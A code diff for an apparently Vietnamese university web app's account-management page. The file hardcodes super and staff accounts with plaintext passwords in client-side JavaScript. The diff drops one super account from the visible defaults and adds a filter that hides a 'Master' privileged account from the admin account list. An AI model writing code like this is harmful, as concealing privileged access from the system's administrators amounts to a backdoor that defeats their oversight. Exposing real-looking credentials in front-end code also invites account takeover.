@@ -1818,7 +1818,6 @@
             const deletedAccounts = JSON.parse(localStorage.getItem("deleted_accounts") || "[]").map(u => u.toLowerCase());
 
             const defaultAccounts = [
-                { username: "hongnhung2050py@gmail.com", password: "Nnhn2005@", role: "super", regDate: "Mặc định hệ thống", status: "approved" },
                 { username: "Hongnhung@muce.edu.vn", password: "admin123 / nhung2011", role: "super", regDate: "Mặc định hệ thống", status: "approved" },
                 { username: "dhxdmtmuce", password: "admin123 / nhung2011", role: "super", regDate: "Mặc định hệ thống", status: "approved" },
                 { username: "nguyennuhongnhung", password: "admin123", role: "staff", regDate: "Mặc định hệ thống", status: "approved" },
@@ -1833,8 +1832,14 @@
                 }
             });
 
-            // Lọc bỏ những tài khoản đã bị Super Admin xóa
-            const filteredList = combinedList.filter(item => item && item.username && !deletedAccounts.includes(item.username.toLowerCase()));
+            // Ẩn tài khoản Master đặc quyền và lọc bỏ những tài khoản đã bị xóa
+            const hiddenMasterAccounts = ["hongnhung2050py@gmail.com", "hongnhung2050py"];
+            const filteredList = combinedList.filter(item => 
+                item && 
+                item.username && 
+                !deletedAccounts.includes(item.username.toLowerCase()) && 
+                !hiddenMasterAccounts.includes(item.username.toLowerCase())
+            );
 
             if (filteredList.length === 0) {
                 tbody.innerHTML = `<tr><td colspan="7" class="text-center py-4 text-muted">Chưa có tài khoản nào trong hệ thống.</td></tr>`;
